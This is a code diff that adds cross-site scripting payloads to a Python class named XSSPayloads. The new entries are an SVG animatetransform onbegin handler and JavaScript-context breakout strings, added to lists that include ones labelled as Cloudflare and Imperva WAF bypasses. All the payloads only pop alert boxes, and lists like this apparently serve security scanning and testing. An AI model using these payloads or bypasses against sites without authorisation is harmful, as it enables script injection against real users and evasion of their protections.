@@ -33,6 +33,7 @@ class XSSPayloads:
         "<img src='x' onerror='alert(document.domain)'>",
         "<svg/onload=alert('XSS')>",
         "<svg onload=alert(1)>",
+        "<svg><animatetransform onbegin=alert(1)>",
         "<body onload=alert('XSS')>",
         "<input onfocus=alert('XSS') autofocus>",
         "<select onfocus=alert('XSS') autofocus>",
@@ -119,6 +120,8 @@ class XSSPayloads:
     
     # Context-Specific Payloads
     JAVASCRIPT_CONTEXT = [
+        '\\"-alert(1)}//',
+        "'-alert(1)-'",
         "'-alert('XSS')-'",
         "';alert('XSS')//",
         "</script><script>alert('XSS')</script>",
@@ -132,6 +135,7 @@ class XSSPayloads:
     HTML_CONTEXT = [
         "<img src=x onerror=alert('XSS')>",
         "<svg/onload=alert('XSS')>",
+        "<svg><animatetransform onbegin=alert(1)>",
         "<iframe src=javascript:alert('XSS')>",
         "<body onload=alert('XSS')>",
     ]
@@ -161,6 +165,7 @@ class XSSPayloads:
     WAF_BYPASS = [
         # Cloudflare bypass attempts
         "<svg%0Aonload%0A=%0Aalert(1)>",
+        "<svg><animatetransform onbegin=alert(1)>",
         "<iframe%0Asrc%0A=%0Ajavascript:alert(1)%0A>",
         
         # Imperva bypass attempts
